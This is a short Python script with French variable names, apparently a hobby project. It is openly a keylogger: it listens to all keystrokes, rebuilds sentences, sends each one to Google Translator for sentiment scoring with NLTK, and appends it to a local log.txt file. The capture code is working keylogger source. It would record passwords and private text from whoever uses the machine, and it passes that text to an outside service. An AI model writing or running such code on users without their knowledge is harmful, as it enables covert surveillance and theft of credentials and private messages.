from pynput import keyboard
import threading
import os
import nltk
from nltk.sentiment import SentimentIntensityAnalyzer
from deep_translator import GoogleTranslator

nltk.download('vader_lexicon')

analyseur_sentiments = SentimentIntensityAnalyzer()
traducteur = GoogleTranslator(source='fr', target='en')

phrase_en_cours = [] 
chemin_fichier = os.path.join(os.getcwd(), "log.txt")  
verrou = threading.Lock()  
programme_actif = True  

def traiter_touche(touche):
    global phrase_en_cours, programme_actif
    try:
        if hasattr(touche, 'char') and touche.char is not None:
            phrase_en_cours.append(touche.char)

        if touche.char in ".!?":
            phrase_complete = "".join(phrase_en_cours).strip()
            if phrase_complete:
                analyser_sentiment(phrase_complete) 
                enregistrer_phrase(phrase_complete)  
            phrase_en_cours.clear()  

    except AttributeError:
        if touche == keyboard.Key.space:
            phrase_en_cours.append(" ")
        elif touche == keyboard.Key.enter:
            phrase_en_cours.append("\n")
        elif touche == keyboard.Key.backspace and phrase_en_cours:
            phrase_en_cours.pop()
        elif touche == keyboard.Key.esc:
            print("\n[INFO] Arrêt du keylogger...")
            programme_actif = False
            return False
    print(f"Touche pressée: {touche}")

def analyser_sentiment(texte):
    try:
        texte_traduit = traducteur.translate(texte)
        scores_sentiments = analyseur_sentiments.polarity_scores(texte_traduit)
        score_global = scores_sentiments['compound']

        print("\n[ANALYSE DES SENTIMENTS]")
        print(f"Texte : {texte}")

        if score_global >= 0.05:
            print(f"[POSITIF] Score : {score_global:.2f}")
        elif score_global <= -0.05:
            print(f"[NÉGATIF] Score : {score_global:.2f}")
        else:
            print(f"[NEUTRE] Score : {score_global:.2f}")
    
    except Exception as e:
        print(f"[ERREUR] Impossible d'analyser le texte : {e}")

def enregistrer_phrase(texte):
    global chemin_fichier
    with verrou:
        with open(chemin_fichier, "a") as fichier:
            fichier.write(texte + "\n")
def start_keylogger():
    global programme_actif
    with keyboard.Listener(on_press=traiter_touche) as ecouteur_clavier:
        ecouteur_clavier.join()  

start_keylogger()